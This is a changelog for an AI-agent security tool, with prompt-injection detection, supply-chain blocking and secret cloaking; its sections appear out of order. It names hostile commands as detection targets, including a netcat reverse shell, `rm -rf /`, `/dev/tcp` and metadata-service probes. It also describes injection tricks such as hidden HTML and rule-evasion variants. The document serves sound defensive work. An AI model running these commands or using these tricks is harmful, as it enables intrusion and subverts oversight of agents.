- **`immunity-agent` is now a thin redirect package** — `pip install immunity-agent` installs `prismor` as a dependency and surfaces a "renamed to prismor" notice on its PyPI page. It carries no code of its own; existing installs keep working via the bundled `prismor` CLI. Use `pip install -U prismor` instead.

## [1.11.0] — 2026-06-26

Supply-chain block/observe output now includes safe version recommendations, and setup writes agent context files for all supported agents.

### Added

- **Safe version recommendations in supply-chain output** — `_score_package()` now calls `recommend_safe_version()` and embeds `safe_version` and `remediation` fields in every `dependency_risk` finding. Block messages print the recommended fix version on stderr; observe mode emits all findings (not just the first) with remediation hints so agents know exactly which packages to pin.
- **Agent context files written on onboarding** — `prismor setup` now calls `_write_agent_context()` unconditionally, writing the key prismor commands (`prismor status`, `supplychain`, `check`, `deps`) into `.cursorrules`, `.windsurfrules`, or `AGENTS.md` depending on the agents selected. Cursor, Windsurf, Codex, Copilot, Hermes, and OpenClaw users all get the reference on first install.
- **SKILL.md installed for all agents** — removed the `if "claude" in agents` gate; SKILL.md now lands in every workspace regardless of agent choice.

## [1.10.0] — 2026-06-24

Setup wizard slimmed to 4 steps, live version banner, and removal of the security-playbook integration.

### Changed

- **Setup wizard is now 4 steps** — the detection-rules toggle step is gone; all rules ship enabled by default. The wizard flows mode → agents → cloak → scope.
- **Version banner reads the live package version** — the banner now reflects `__version__` (mirrored in `scripts/setup.py` with a file-parse fallback) instead of a hardcoded value.
- **Cloak install no longer shells out to the deprecated `prismor` binary** — the "`prismor` is deprecated" warning no longer appears during setup.

### Removed

- **All security-playbook references** — setup no longer wires the playbook into `CLAUDE.md` or prints a Guardrails link; references stripped from `CLAUDE.md`, `AGENTS.md`, and `PYPI.md`, pointing at local `SKILL.md`/docs instead.

## [1.9.0] — 2026-06-24

Setup wizard install-scope control and CLI help/rules-list polish.

### Added

- **Install-scope step in `prismor setup`** — a new wizard step lets you choose between installing Prismor hooks for the current workspace only (`.claude/settings.json`) or globally for every project (`~/.claude/settings.json`). The chosen scope now flows through hook and cloak installation (previously hard-coded to `project`). Exposed on `run_non_interactive` via `scope=`.

### Changed

- **Detection-rules step is sorted and truncated** — rules are ordered CRITICAL → HIGH → MEDIUM → LOW and the list shows the top 15 by default with an `e` to expand / `c` to collapse, so long rule sets stay readable.
- **`prismor help` shows full command names** — commands, sub-actions, and the Help/Deprecated sections now render the full `prismor <cmd>` form instead of bare names, so entries are copy-pasteable.

## [1.8.0] — 2026-06-23

CLI UX consolidation, Codex agent support, and supply-chain enforcement hardening.

### Added

- **Codex (OpenAI) agent support** — `--agent codex` wires Prismor hooks into Codex CLI (`.codex/hooks.json`) for real-time monitoring.
- **`prismor status --all`** — global overview across every registered workspace (the old `prismor dashboard` text view), with `--days N` to set the activity window.
- **Bundled Claude skill** — `prismor setup` now installs the `immunity-agent` skill (SKILL.md + docs) into `<workspace>/.claude/skills/immunity-agent/` for Claude Code, so the agent learns to drive the CLI. The skill ships inside the wheel.

### Changed

- **`prismor dashboard` opens the web dashboard** — it now starts the local server *and* opens a browser tab (`--no-open` for headless). `prismor serve` is kept as a deprecated alias of `dashboard --no-open`.
- **`prismor info` → real alias of `status`** — the duplicate workspace-info renderer is gone; `info` now delegates to `status`.
- **Complete, introspection-driven `prismor help`** — every command is listed (previously `sandbox`/`learn` were omitted), grouped, with each domain's sub-actions and each command's mode flags (`sweep --redact/--clean/…`, `audit --fix`, `status --all`) shown inline. Generated from the live parser so it can't drift.
- **`prismor` (bare) no longer dumps the argparse usage wall** — it prints a one-line deprecation pointer to `prismor help`. `prismor <cmd>` still warns and forwards.
- **Install banner relabeled** — `Hooks` / `Skill` / `Guardrails` (was the conflated "Skills").

### Fixed

- **Supply-chain enforcement gap** — closes a gap across hooks, ecosystems, and dependency depth so install gating applies consistently; adds lockfile-integrity coverage.

## [1.7.1] — 2026-06-17

Enterprise audit hardening and branding rename.

### Fixed

- **Non-overridable enforcement floor (audit #1/#3/#12)** — floor rules (core IDs and core block categories) get `mode: enforce` regardless of `default_mode` and can no longer be downgraded by a policy overlay. Synthetic `action: block` findings (canary, vault, secret-exfil, taint, HTML-injection) are normalized to `mode: enforce`, restoring block intent that per-rule modes had dropped.
- **Telemetry title redaction (audit #5)** — redacted-mode records no longer forward raw paths/hosts/URLs/secrets via the dynamic title; `assert_redacted` now also rejects path/host/URL leaks in the title.
- **Control-plane refresh clamp, heartbeat permissions, logout cleanup, spool age-cap (audit #11/#18/#20)** — `PRISMOR_POLICY_REFRESH_SECONDS` is clamped to `[5s, 600s]`; `heartbeat.json` is now `chmod 0600`; logout clears `heartbeat.json` and `workspace-scopes.json`; telemetry spool drops records older than 30 days (`PRISMOR_SPOOL_MAX_AGE_DAYS`).
- **Telemetry repo identifier gating (audit #17)** — personal/local-only workspaces never attach their git remote to telemetry, mirroring the existing heartbeat gate.

### Changed

- **Rebrand to "Prismor Immunity Agent"** — replaces "Prismor" / "PRISMOR IMMUNITY" labels across the CLI, setup wizard, hooks, dashboard, and tests; `--version` string updated.
- **Dashboard `--days` window + sparklines** — `prismor dashboard` accepts `--days N` (default 7) to filter session data; adds per-workspace and global sparkline bars showing the daily findings trend. Web dashboard gains a Period dropdown (7/14/30/90 days).

### Docs

- README: new "Disabling Immunity Agent" section covering hook uninstall, observe+dry-run soft-disable, and clearing per-session scoped-agent rules.

## [1.7.0] — 2026-06-16

Enterprise control-plane and policy hardening release.

### Added

- **Enterprise control-plane** — signed remote policy pulls, device identity and enrollment, layered workspace scoping, admin-granted exemptions, offline telemetry spool, and heartbeat / telemetry ingest hardening.
- **Per-rule enforcement** — policy-authoritative observe/enforce modes now gate on each rule's effective mode instead of the global install mode alone.
- **Pattern customization** — add/disable pattern overrides with compile isolation and a non-weakening floor for core rules.
- **Prompt-injection coverage** — deterministic regex and heuristic coverage expanded to close benchmark false negatives without adding LLM cost.
- **Supply-chain hardening** — gitleaks version gating, cross-platform install hints, AI-key ruleset, and graceful fallback scanning when the binary is absent.

### Fixed

- **Session-report follow-ups** — closes the remaining v1.6.0 report issues, including claude transcript scoping, exfiltration-directive detection, SCM-domain false positives, and shell-level PII detection.

## [1.6.0] — 2026-06-05

Hermes Agent secret cloaking plugin. Secret prevention now works natively inside Hermes Agent (Nous Research's AI agent platform), with dual-discovery via pip entry point or filesystem install.

### Added

- **Hermes Agent cloaking plugin** (`prismor/runtime/cloaking/hermes_plugin_entry.py`) — shared `register()` function consumed by both Hermes' pip entry-point discovery and filesystem install. Five hooks: `pre_tool_call` (decloak + secret guard), `post_tool_call` (audit), `transform_terminal_output` (scrub), `transform_tool_result` (scrub), `pre_gateway_dispatch` (paste guard).
- **Hermes installer** (`prismor/runtime/cloaking/hermes_installer.py`) — `install()`/`uninstall()`/`status()` for filesystem-level setup. Copies plugin files to `~/.hermes/plugins/prismor-cloak/`, enables it in Hermes config, and sets `PRISMOR_SECRETS_DIR` env var.
- **`pyproject.toml` entry point** — registers `prismor-cloak` under `[project.entry-points."hermes_agent.plugins"]` for auto-discovery when immunity-agent is pip-installed.
- **`prismor cloak install --agent hermes`** — new `--agent` flag on `cloak install`/`uninstall`/`status` supports `claude`, `hermes`, or `all`. Installs for both agents in one command.
- **`prismor cloak status`** — now shows both Claude Code and Hermes Agent state separately.
- **Auto-vaulting for pasted secrets** — `pre_gateway_dispatch` detects raw secrets in user prompts, vaults them under deterministic `auto_<sha256_prefix>` names, and re-sends the sanitized prompt with `@@SECRET:auto_xxx@@`. Bypass with `!!allow` prefix.
- **Documentation:** `docs/hermes.md` with architecture diagram, setup guide, and hook reference. AGENT_INTEGRATIONS.md updated with Hermes cloaking layer.

### Packaging

- Hermes plugin files (`plugin.yaml`, `__init__.py`) are force-included in the wheel under `prismor/runtime/data/cloaking/hermes-plugin/` for filesystem install.
# Changelog

All notable changes to Immunity Agent (Prismor) are documented here.
The format loosely follows [Keep a Changelog](https://keepachangelog.com/)
and the project uses [Semantic Versioning](https://semver.org/).

## [1.5.7] — 2026-05-31

Onboarding reliability: the installer can no longer report success while
installing nothing, and a broken/partial install can no longer break the
host Python. Also ships the hybrid semantic prompt-injection defense from
1.5.6, which was bumped in code but never published to PyPI.

### Fixed

- **`scripts/init.sh` — honest install status.** The git-clone path printed
  `Prismor: hooks installed` unconditionally, even when every `install-hooks`
  call failed (errors were swallowed by `2>/dev/null`). The final banner is
  now driven by a real success counter: zero hooks installed → loud
  `Initialization FAILED` and exit 1, with the underlying error surfaced
  instead of hidden.
- **`immunity-agent.pth` — crash-proof startup hook.** The shipped `.pth`
  ran `import prismor.runtime._post_install` at every Python interpreter startup. If
  `prismor` was ever unimportable (e.g. an editable install whose source dir
  was later deleted), this printed a traceback on *every* `python3`
  invocation machine-wide and poisoned the `prismor` namespace so the cloned
  CLI also failed. Now wrapped in `try/except` so it can never raise.
- **`scripts/init.sh` — `immunity` on PATH.** The git-clone path never added
  the CLI to PATH, so the next documented command (`prismor cloak add`) was
  `command not found`. It now symlinks into `/usr/local/bin` (or appends to
  the shell rc).
- **`scripts/init.sh` — non-interactive exit code.** The trailing "Check
  current session?" prompt hit EOF under `set -e` in piped/CI runs and made
  the installer exit 1 *after* a fully successful install. It is now gated on
  a TTY. Also corrects the stale `prismor.git` → `immunity-agent.git` repo URL
  and only shows the "switch to enforce mode" hint when not already enforcing.

## [1.5.6] — 2026-05-28

Hybrid semantic prompt-injection defense.

### Added

- **`prismor/runtime/semantic_guard.py`** — heuristic semantic-injection detector with
  35+ weighted regex signals covering authority claims, compliance pretexts,
  friction-reduction manipulation, roleplay/jailbreak framing, instruction
  override, credential exfiltration, Prismor self-bypass, nested file-injection
  markers, and indirect privilege escalation. Optional Claude API mode (no
  API key required for the default path).
- **`prismor/runtime/semantic_guard_v2.py`** — hybrid guard with uncertain-zone
  escalation. Pipeline: heuristic pre-screen → if score in `[low, high)`,
  escalate to a local Claude Code CLI subagent (no API key needed); merge
  the stricter verdict. Falls back to heuristic-only when the CLI is absent.
- **`PolicyEngine` integration** — opt-in `settings.semantic_guard` block in
  `default_policy.yaml`. Emits `prompt_injection_semantic` findings alongside
  regex findings; participates in session taint marking. Off by default;
  zero overhead unless enabled per-project.
- **`prismor semantic-check`** CLI subcommand — ad-hoc analyzer for tuning
  policies and debugging false positives. Supports `--mode hybrid|heuristic|api`
  and `--json` output.
- **`tests/test_semantic_guard.py`** — 15 unit tests covering heuristic
  detection, threshold gating, CLI-absent graceful degrade, and PolicyEngine
  integration.

### Notes

Benchmarked on 826 cases spanning OWASP LLM01–LLM10, OWASP Agentic T02–T04,
MITRE-ATLAS, and nested-file injection: F1 improves 0.697 → 0.822; semantic
attack recall improves 8% → 72%; the LLM subagent is invoked on 1.8% of
events (15/826). Enable per-project with:

```yaml
# .prismor/policy.yaml
settings:
  semantic_guard:
    enabled: true
```

## [1.5.0] — 2026-05-13

Expanded IOC coverage and prompt injection defense.

### Added

- **Prompt injection defense** (`prismor/runtime/sanitizer.py`, `prismor/runtime/policy_engine.py`):
  - `sanitizer.py` — structural HTML detector catching injections hidden in HTML
    comments, CSS-invisible elements (`display:none`, `visibility:hidden`,
    `font-size:0`, transparent color), `aria-hidden` elements, and zero-width
    character obfuscation. Complement to YAML regex rules.
  - `_TaintStore` — per-session taint state persisted across hook invocations.
    Once a prompt injection is detected, all subsequent network calls in the
    session are escalated to CRITICAL, closing the response-blind exfiltration gap.
  - `_check_cloaked_secrets_in_url` — checks enrolled cloaking secrets against
    outbound URLs regardless of key shape (fills the gap the YAML patterns can't cover).
  - Two new CRITICAL policy rules: `prompt-injection-hidden` and `secret-in-url-params`
    (covers Anthropic, OpenAI, GitHub, AWS, Slack, Google, Stripe key shapes).

- **Expanded mini-shai-hulud IOC coverage** (`supplychain/ioc.py`):
  - New compromised namespaces: `@opensearch-project/*` (1.3M weekly downloads),
    `@uipath/*` (65 packages).
  - New PyPI packages: `mistralai==2.4.6`, `guardrails-ai==0.10.1`.
  - New C2 domain: `git-tanstack.com` (Cloudflare-flagged phishing domain).
  - New payload hash: `tanstack_runner.js` (SHA-256 `ce7e4199...`).
  - New script patterns: AWS IMDS probe (`169.254.169.254`), HashiCorp Vault
    probe (`127.0.0.1:8200`), GitHub GraphQL worm propagation
    (`createCommitOnBranch`), token regexes (`ghp_*`, `npm_*`), and new
    persistence paths (`.claude/setup.mjs`, `.claude/router_runtime.js`,
    `.vscode/setup.mjs`).
  - Attribution: TeamPCP — same actor as March 2026 Trivy supply chain compromise.

## [1.4.0] — 2026-05-12

Supply Chain Enforcement — `immunity` CLI. Intercepts package manager install
commands before execution, scores each package against live threat intelligence,
and blocks or warns based on risk signals. Ships with IOC coverage for the
mini-shai-hulud attack (May 11 2026) out of the box.

### Added

- **`immunity` CLI wrapper** — shebang script at repo root intercepts
  `npm/pip/pnpm/uv/cargo/go install` commands before execution.
- **`supplychain/ecosystems/detector.py`** — parses install argv into a
  structured `InstallEvent` across 9 ecosystems.
- **`supplychain/ecosystems/metadata.py`** — fetches npm and PyPI registry
  metadata (age, maintainers, install scripts); stdlib only, fail-open.
- **`supplychain/scoring/engine.py`** — additive signal scorer producing
  allow/warn/block verdicts.
- **`supplychain/ioc.py`** — IOC database covering `@tanstack/*`,
  `@mistralai/mistralai` 1.7.1–2.2.4, C2 domains (`getsession.org`,
  `masscan.cloud`), and install script patterns (Bun download,
  `router_init.js`, credential env var access, persistence writes).
- **`docs/supply-chain.md`** — full documentation: usage, scoring table,
  ecosystem support, IOC advisory for mini-shai-hulud, guide for adding new
  IOCs, internal architecture.

## [1.3.0] — 2026-05-11

Web Dashboard — `prismor serve`. Introduces a local HTTP API server and
self-contained browser dashboard that aggregates session, findings, and event
data from all registered workspaces.

### Added

- **`prismor serve` command** (`prismor/runtime/server.py`, `prismor/runtime/dashboard.html`).
  Starts a local HTTP server (default `127.0.0.1:7070`) serving a
  self-contained Prismor dashboard. Accepts `--host` and `--port` flags.
- **Dashboard UI** with severity breakdown strip (critical/high/medium/low
  counts), recent sessions table with risk-score bars, and a findings drilldown
  with agent/severity/category filters, free-text search, and expandable
  evidence rows showing raw command/path and session ID.
- **Server-side pagination** for sessions (`/api/sessions`), findings
  (`/api/findings`), and events (`/api/events`) — each endpoint accepts
  `page`, `limit`, sort, and filter query params; returns
  `{items, total, page, pages, limit}`.
- **Live event feed** with verdict (blocked/allowed) and agent filter controls;
  auto-poll pauses when user has active filters or is past page 1.
- **`get_sessions_page()`, `get_findings_page()`, `get_events_page()`** added
  to `prismor/runtime/store.py`; `get_aggregate_stats()` extended with
  `severityBreakdown`, `recentSessions`, and `recentFindings`.

### Fixed

- **XSS prevention in dashboard**: replaced all `innerHTML` string
  concatenation with a `safe()` helper that text-encodes untrusted values
  before inserting them into the DOM.

## [1.2.0] — 2026-04-27

Tier 3 — Scoped Agent and Session-Based Learning. Adds per-session rule
synthesis via the Anthropic API, a session-based learning engine that mines
uncovered command patterns and detects evasion attempts, and five security
and correctness fixes from code review.

### Added

- **Scoped Agent** (`prismor/runtime/scoped_agent.py`). On `UserPromptSubmit`, Prismor
  calls the Anthropic API (Haiku) to synthesise a minimal, task-specific rule
  set from the user's goal — restricting tools, file paths, and network access
  to only what the task genuinely requires. Falls back to keyword-based static
  heuristics when no API key is present. Scoped rules are stored as JSON
  sidecar files in `.prismor/scoped/` and enforced alongside
  `policy.yaml` for the duration of that session only.
- **Session-Based Learning** (`prismor/runtime/learning.py`). Mines historical session
  data for recurring uncovered command patterns, tracks false positives from
  dismissed findings, and detects evasion attempts where structurally similar
  commands (e.g. backtick vs `$()` substitution) bypass existing rules.
  Candidate rules can be reviewed and promoted to `policy.yaml`.
- **`prismor scope` subcommands** — `show`, `list`, `edit`, `clear` for
  inspecting and managing active scoped sessions.
- **`prismor learn` subcommands** — `--json`, `--apply`, `--reject`,
  `--candidates` for reviewing and acting on mined rule proposals.
- **Evasion detection** — shell commands that pass policy but are structurally
  similar (Jaccard ≥ 0.6 after substitution normalisation) to a recently
  blocked command in the same session are flagged as `HIGH` findings.
- **Dismissal tracking** — in observe mode, dismissed findings are recorded
  in the database and surfaced via `prismor learn` as false-positive candidates.

### Fixed

- **Prompt-injection mitigation in scoped rule synthesis**: LLM-returned
  `allowed_tools` and `deny_tools` are now clamped to the known-good
  `available_tools` list, preventing a crafted task prompt from expanding the
  scoped policy beyond what the agent actually has access to.
- **Command injection in `prismor scope edit`**: replaced
  `os.system(f'{editor} "{path}"')` with `subprocess.run([editor, path])`
  to prevent shell metacharacter exploitation via the `$EDITOR` env var.
- **`KeyError: 'id'` in `prismor learn` output**: `format_learning_report`
  now uses `c.get('id', c['rule'].get('id', '?'))` so freshly-mined
  candidates (not yet persisted to the DB) display correctly.
- **Misleading scoped-rules display text**: the rules box now correctly states
  that rules persist in `.prismor/scoped/` rather than claiming they
  are not saved.
- **Removed dead `get_scoped_dir()` from `prismor/runtime/store.py`**: the function
  was unreachable and pointed to a different path than `scoped_agent._scoped_dir`.

## [1.1.0] — 2026-04-24

Tier 1 coverage expansion from `IMPROVEMENT_PLAN.md` — focused on closing
audit-level detection gaps and adding the developer- and SIEM-facing
ergonomics features enterprise buyers expect. Continues from `1.0.2`.

### Added

- **Canarytoken subsystem** (`prismor canary plant|list|remove|status`). Plant
  realistic fake credentials (AWS, SSH, `.env`, generic) at arbitrary paths;
  any read raises a `CRITICAL` finding and optionally POSTs a signed payload
  to a user-provided webhook. First AI-agent-specific canarytoken
  implementation we're aware of. (`prismor/runtime/canary.py`)
- **MCP schema auditor** — `prismor scan` now statically analyses MCP tool
  schemas for over-broad allowlists (`"*"`, `"/**"`), risky description
  language (`bypass`, `all files`, `sudo`), `any`-typed parameters on
  execution-capable tools, missing input schemas, and servers that combine
  execution with filesystem + network access in a single surface.
  (`prismor/runtime/scanner.py::audit_mcp_schema`)
- **Lockfile integrity audit** — `prismor deps` now detects non-registry
  sources (`git+`, `file:`) in `package-lock.json`, missing `integrity:`
  hashes, and lockfile-injection (direct deps in the lockfile that aren't
  declared in `package.json`). (`prismor/runtime/deps.py::check_lockfile_integrity`)
- **Agent instruction-file tamper detection** — new `agent-instruction-tampering`
  rule covers `CLAUDE.md`, `AGENTS.md`, `.cursorrules`, `.windsurfrules`,
  `.github/copilot-instructions.md`. Previously only `.claude/settings.json`
  was protected. (`prismor/runtime/default_policy.yaml`)
- **Unicode / homoglyph path detection** — flags paths and commands that mix
  ASCII letters with Cyrillic, Greek, Latin-extended confusables, fullwidth
  letters, and zero-width joiners (e.g. `cat .еnv` where `е` is U+0435).
  (`prismor/runtime/policy_engine.py::_has_suspicious_unicode`)
- **Telemetry sinks** — new `settings.outputs` section in `policy.yaml`
  forwards findings to webhook, syslog (UDP/TCP), and file sinks. File sink
  supports both JSON and ArcSight CEF formats for SIEM ingest. Env-var
  interpolation (`${SIEM_TOKEN}`) for secret headers. (`prismor/runtime/sinks.py`)
- **Declarative policy tests** — `prismor policy test` runs
  `.prismor/policy-tests.yaml` cases (`{input, expect: block|warn|pass}`)
  and ships a bundled OWASP LLM Top 10 + Agentic Top 10 + MITRE ATLAS
  starter pack (28 cases). (`prismor/runtime/policy_test.py`,
  `templates/policy-tests-owasp.yaml`)
- **`prismor check --explain`** — shows matched rule's category, action,
  event types, field list, and full regex pattern.
- **`prismor check --from-log PATH`** — replay a JSONL session log through the
  current policy to validate rule changes.
- **`prismor check --suggest-allowlist`** — emits a ready-to-paste
  `allowlists:` entry when a command triggers a finding the user considers
  intentional.

### Changed

- **Destructive-command rule** now accepts positional arguments with
  optional quotes (`rm -rf "/etc"`), catches separate flags (`rm -r -f /`)
  and long-form (`rm --recursive --force /`), while still passing safe
  cleanup (`rm -rf ./node_modules`, `rm -rf /tmp/build`, `rm -rf ../build`).
- **Reverse-shell rule** catches `nc -lvp 4444 -e /bin/bash` (combined
  listen+port flag) in addition to the separate `-l` / `-p` form.
- **`/dev/tcp/<host>`** now matches any hostname, not just dotted-quad IPs.
- **TLS verification bypass** rule extended: `git -c http.sslVerify=false`
  inline override, `curl -sk` / `-ksL` / `-Lk` combined flags.
- **npm supply-chain** rules: `--registry` flag matched regardless of
  position (before or after `install|i|add`); yarn/pnpm parity.
- **Shell-obfuscation** rule now matches `perl pack(q{H*}, …)` alternate
  Perl quoting forms in addition to classic `pack("H*", …)`.

### Infrastructure

- `prismor deps` now prints a dedicated "Lockfile integrity issues"
  section and exits `1` when a HIGH-severity integrity issue is present.
- `prismor canary remove` by id or path; `prismor canary status` summarises
  registered canaries by type.
- `prismor hook-dispatch` now invokes telemetry sinks BEFORE the blocking
  decision so SIEMs see every event, including blocked ones.

### Tests

- 227 unit tests, all passing (no regression since 0.2.0).
- 28/28 OWASP starter policy-test cases pass on a clean install.
- Lightsail regression matrix: 97/97 adversarial and golden-path cases
  green (same matrix that validated PR #19).

## [0.2.0] — 2026-04-21

First comprehensive audit-fix release — see PR #19 in the GitHub repo for
details. Closes 15 detection/lifecycle gaps identified by external review
plus six adversarial bypass variations surfaced during variation testing.
